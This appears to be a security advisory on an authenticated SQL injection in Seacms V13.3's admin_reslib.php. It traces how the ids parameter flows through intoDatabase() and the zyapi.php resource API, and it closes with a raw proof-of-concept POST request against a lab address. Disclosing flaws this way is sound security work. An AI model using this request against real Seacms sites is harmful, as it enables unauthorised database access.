Seacms V13.3 has an SQL injection vulnerability that allows an authenticated attacker to exploit the database.

Download address：https://www.seacms.com/download/



![image-20250114112528569](images/image-20250114112528569.png)



The vulnerability is located in the admin_reslib.php file. Starting at line 321, if the value of '$action' is' select 'and the $ids option exists, then proceed further. The 'implode()' function is used to convert the array '$ids' into a comma-separated string' $a_ids', focusing on line 335. If '$rid' is not equal to 'seazmt3zz2cmszmt', a different URL is constructed, which may contain other parameters. Such as' ac ', 'ressite' and 'ids', and here the' strpos() 'function is used to check whether' $var_url 'already contains the query string (i.e.'? 'symbol). If not, add '? 'to the URL. '; If it is already included, '&' is added to continue appending arguments, then the function 'intoDatabase()' is called, and the constructed $weburl and string 'select' are passed to the function as arguments to close the loop.





![image-20250114143205244](images/image-20250114143205244.png)



上述中对 ids进行了判断，从该参数找到关联功能资源api模块zyapi.php文件，那么admin_reslib.php文件中的`intoDatabase()`函数的目的是发送HTTP请求到`$weburl`，然后处理响应，将采集到的数据保存到数据库中，zyapi.php就是给数据admin_reslib.php文件，由此可得出该参数是可以控制并且造成SQL注入问题。

![image-20250114144814465](images/image-20250114144814465.png)



```
POST /seacms/bf6nbn/admin_reslib.php? HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Referer: http://192.168.80.152/seacms/bf6nbn/admin_reslib.php?ac=list&rid=cdd&url=https://www.seacms.org/zyapi.php
Cookie: PHPSESSID=s5fhh9q24e7k8rjpi28g6o3j40; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MTA6InBocCB8IHBocD8iO3M6MzoiYWxsIjtpOjA7czozOiJodGEiO2k6MTt9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 191

ac=select&rid=cdd&backurl=%3Fac%3Dlist%26rid%3Dcdd%26t%3D%26h%3D%26wd%3D%26pg%3D1%26url%3Dhttps%3A%2F%2Fwww.seacms.org%2Fzyapi.php&url=https%3A%2F%2Fwww.seacms.org%2Fzyapi.php&ids%5B%5D=70792
```





![](images/image-20250114042657077.png)




